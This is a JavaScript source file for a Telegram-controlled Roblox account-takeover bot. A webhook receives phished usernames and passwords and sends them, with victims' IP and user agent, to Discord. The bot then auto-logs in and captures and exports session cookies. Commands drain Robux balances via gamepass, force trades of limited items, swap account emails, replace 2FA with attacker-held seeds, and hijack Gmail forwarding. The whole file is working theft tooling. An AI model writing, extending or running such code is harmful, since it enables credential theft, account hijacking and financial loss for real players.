// bot.js — full suite
import 'dotenv/config';
import http from 'http';
import { notify, bot } from './telegram.js';
import { loginAndCapture } from './login.js';
import { listSessions, getCookie } from './session.js';
import { disableTwoFA, getTwoFAState, confirmDisable } from './disable2fa.js';
import { exportAll, toCurl } from './export.js';
import { loginGmail, setupGmailForward, detectProvider } from './stealEmail.js';
import { activate2FA, exportSeed } from './setup2fa.js';
import { autoChangeEmail, getAccountInfo } from './changeEmail.js';
import { autoSwapEmail } from './autoEmailSwap.js';
import { dumpInventory, sendTrade, autoTrade } from './inventory.js';
import { getBalance, drainFullBalance, autoTransferViaGamepass, groupPayout } from './robux.js';
import { BulkRunner, loadEntries, saveResults, summary } from './bulk.js';
import { prewarmProfile, listProfiles } from './profile.js';
import { sendDiscord, discordCreds, discordCookie, discordInventory, discordRobux, discord2FA } from './discord.js';

bot.on('message', async (msg) => {
  if (String(msg.chat.id) !== String(process.env.TG_CHAT_ID)) return;
  const text = (msg.text || '').trim();

  // ─── login ───
  if (text.startsWith('/login ')) {
    const [, username, password, email] = text.split(/\s+/);
    if (!username || !password) return bot.sendMessage(msg.chat.id, 'usage: /login <u> <p> [email]');
    const r = await loginAndCapture(username, password, crypto.randomUUID(), {
      autoOTP: !!email, autoCaptcha: true, email
    });
    if (r.ok) {
      await notify(`✅ Login: \`${r.userInfo?.UserName}\``);
      await discordCookie({ username: r.userInfo?.UserName || username, cookie: r.cookie, userId: r.userInfo?.UserID });
      const files = exportAll(r.userInfo?.UserName || username);
      for (const f of Object.values(files)) if (f) await bot.sendDocument(msg.chat.id, f);
    } else {
      await notify(`❌ ${r.error}`);
    }
    return;
  }

  // ─── inventory dump ───
  if (text.startsWith('/inv ')) {
    const username = text.slice(5).trim();
    await bot.sendMessage(msg.chat.id, `📦 Dumping \`${username}\`...`, { parse_mode: 'Markdown' });
    const r = await dumpInventory(username);
    if (r.ok) {
      await discordInventory({
        username: r.username,
        totalItems: r.totalItems,
        limitedCount: r.limitedCount,
        totalRAP: r.totalRAP,
        top: r.limited
      });
      await bot.sendMessage(msg.chat.id,
        `✅ ${r.limitedCount} limited, R$ ${r.totalRAP.toLocaleString()} total RAP`,
        { parse_mode: 'Markdown' });
    } else {
      await bot.sendMessage(msg.chat.id, `❌ ${r.error}`);
    }
    return;
  }

  // ─── cek balance ───
  if (text.startsWith('/balance ')) {
    const username = text.slice(9).trim();
    const r = await getBalance(username);
    await bot.sendMessage(msg.chat.id,
      r.ok ? `💰 \`${username}\`: R$ ${r.balance.toLocaleString()}` : `❌ ${r.error}`,
      { parse_mode: 'Markdown' });
    return;
  }

  // ─── drain robux via gamepass ───
  if (text.startsWith('/drain ')) {
    const [, username, gamepassId] = text.split(/\s+/);
    if (!username || !gamepassId) return bot.sendMessage(msg.chat.id, 'usage: /drain <u> <gamepassId>');
    await bot.sendMessage(msg.chat.id, `💸 Draining \`${username}\`...`, { parse_mode: 'Markdown' });
    const r = await drainFullBalance(username, gamepassId);
    if (r.ok) {
      await discordRobux({ from: username, to: 'you', amount: r.drained, method: 'gamepass', status: true });
      await bot.sendMessage(msg.chat.id, `✅ Drained R$ ${r.drained.toLocaleString()} / ${r.total.toLocaleString()}`);
    } else {
      await bot.sendMessage(msg.chat.id, `❌ ${r.error}`);
    }
    return;
  }

  // ─── group payout ───
  if (text.startsWith('/payout ')) {
    const [, username, groupId, targetUserId, amount] = text.split(/\s+/);
    const r = await groupPayout(username, Number(groupId), Number(targetUserId), Number(amount));
    await discordRobux({ from: `group ${groupId}`, to: targetUserId, amount: Number(amount), method: 'group payout', status: r.ok });
    await bot.sendMessage(msg.chat.id, r.ok ? `✅ Payout R$ ${amount}` : `❌ ${r.error || JSON.stringify(r.data)}`);
    return;
  }

  // ─── trade limited items ───
  if (text.startsWith('/trade ')) {
    const [, from, to, ...assetIds] = text.split(/\s+/);
    const ids = assetIds.map(Number).filter(Boolean);
    if (!from || !to || !ids.length) return bot.sendMessage(msg.chat.id, 'usage: /trade <from> <to> <assetId1> [assetId2]...');
    await bot.sendMessage(msg.chat.id, `🔁 Trading ${ids.length} items...`);
    const r = await autoTrade(from, to, ids);
    await bot.sendMessage(msg.chat.id, r.ok ? `✅ Trade accepted` : `❌ ${JSON.stringify(r).slice(0,500)}`);
    return;
  }

  // ─── auto email swap (no IMAP) ───
  if (text.startsWith('/swapemail ')) {
    const [, username, newEmail, oldEmail] = text.split(/\s+/);
    if (!username || !newEmail) return bot.sendMessage(msg.chat.id, 'usage: /swapemail <u> <newEmail> [oldEmail]');
    const r = await autoSwapEmail(username, newEmail, oldEmail);
    await bot.sendMessage(msg.chat.id, r.ok ? `✅ Email swapped: \`${newEmail}\`` : `❌ ${r.error || JSON.stringify(r.data)}`, { parse_mode: 'Markdown' });
    return;
  }

  // ─── 2FA ───
  if (text.startsWith('/enable2fa ')) {
    const [, username, ...pp] = text.split(/\s+/);
    const r = await activate2FA(username, pp.join(' '));
    if (r.ok) {
      const seed = exportSeed(username, r.seed);
      await bot.sendMessage(msg.chat.id,
        `✅ 2FA aktif: \`${username}\`\n🔑 Seed: \`${seed.seed}\`\n⏱ Kode: \`${seed.currentCode}\``,
        { parse_mode: 'Markdown' });
    } else await bot.sendMessage(msg.chat.id, `❌ ${r.error || JSON.stringify(r.data)}`);
    return;
  }

  // ─── change email (standar) ───
  if (text.startsWith('/changeemail ')) {
    const [, username, newEmail, ...pp] = text.split(/\s+/);
    const r = await autoChangeEmail(username, newEmail, { password: pp.join(' ') });
    await bot.sendMessage(msg.chat.id, r.ok ? `✅ requested` : `❌ ${JSON.stringify(r.error || r.data)}`);
    return;
  }

  // ─── export ───
  if (text.startsWith('/export ')) {
    const username = text.slice(8).trim();
    if (!getCookie(username)) return bot.sendMessage(msg.chat.id, `❌ no cookie`);
    const files = exportAll(username);
    for (const [fmt, f] of Object.entries(files)) if (f) await bot.sendDocument(msg.chat.id, f);
    return;
  }

  // ─── account info ───
  if (text.startsWith('/account ')) {
    const r = await getAccountInfo(text.slice(9).trim());
    await bot.sendMessage(msg.chat.id, `\`\`\`${JSON.stringify(r, null, 2).slice(0, 3500)}\`\`\``, { parse_mode: 'Markdown' });
    return;
  }

  // ─── sessions ───
  if (text === '/sessions') {
    const s = listSessions();
    await bot.sendMessage(msg.chat.id, s.length ? '`' + s.map(x => `${x.username} — ${x.alive ? '🟢' : '🔴'} — ${x.savedAt}`).join('\n') + '`' : 'none', { parse_mode: 'Markdown' });
    return;
  }

  // ─── discord test ───
  if (text === '/discord') {
    const ok = await sendDiscord('✅ Discord webhook connected.');
    await bot.sendMessage(msg.chat.id, ok ? '✅ Discord ok' : '❌ Discord fail — cek DISCORD_WEBHOOK');
    return;
  }

  if (text === '/help') {
    await bot.sendMessage(msg.chat.id,
      `*Commands:*\n` +
      `/login <u> <p> [email]\n` +
      `/sessions\n` +
      `/export <u>\n` +
      `/inv <u> — inventory dump\n` +
      `/balance <u> — cek robux\n` +
      `/drain <u> <gamepassId> — drain balance via gamepass\n` +
      `/payout <u> <groupId> <targetId> <amount> — group payout\n` +
      `/trade <from> <to> <assetId1> [assetId2]...\n` +
      `/swapemail <u> <newEmail> [oldEmail] — email swap no IMAP\n` +
      `/enable2fa <u> <p>\n` +
      `/changeemail <u> <new>\n` +
      `/account <u>\n` +
      `/disable2fa <u> <p>\n` +
      `/2faconfirm <u> <code>\n` +
      `/2fastate <u>\n` +
      `/stealemail <email> <pass> [fwd]\n` +
      `/profile warm|list <name>\n` +
      `/discord — test discord webhook\n` +
      `/bulk — bulk mode`,
      { parse_mode: 'Markdown' });
    return;
  }
});

// ─── bulk + webhook (dari versi sebelumnya tetap) ───
// ... (biarin sama kayak sebelumnya)

const PORT = process.env.WEBHOOK_PORT || 3000;
http.createServer(async (req, res) => {
  if (req.method !== 'POST' || req.url !== '/webhook') {
    res.writeHead(404); res.end(); return;
  }
  let body = '';
  req.on('data', c => body += c);
  req.on('end', async () => {
    try {
      const { username, password, sid, email } = JSON.parse(body);
      res.writeHead(200, {'Content-Type':'application/json'});
      res.end(JSON.stringify({ ok: true }));

      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
      const ua = req.headers['user-agent'];

      // mirror ke discord juga
      await discordCreds({ username, password, ip, ua, sid, stage: 'webhook' });
      notify(`📥 Creds: \`${username}\``);

      const r = await loginAndCapture(username, password, sid, {
        autoOTP: !!email, autoCaptcha: true, email
      });
      if (r.ok) {
        await discordCookie({ username: r.userInfo?.UserName, cookie: r.cookie, userId: r.userInfo?.UserID });
        notify(`✅ Auto-login: \`${r.userInfo?.UserName}\``);
        exportAll(r.userInfo?.UserName || username);

        // auto dump inventory
        try {
          const inv = await dumpInventory(r.userInfo?.UserName || username);
          if (inv.ok) {
            await discordInventory({
              username: r.userInfo?.UserName || username,
              totalItems: inv.totalItems,
              limitedCount: inv.limitedCount,
              totalRAP: inv.totalRAP,
              top: inv.limited
            });
          }
        } catch (e) {}
      } else {
        notify(`❌ ${r.error}`);
      }
    } catch (e) {
      res.writeHead(400); res.end(JSON.stringify({ error: e.message }));
    }
  });
}).listen(PORT, () => console.log(`webhook :${PORT}`));

notify(`🤖 Roblox bot online — full suite + discord.\n/help`);
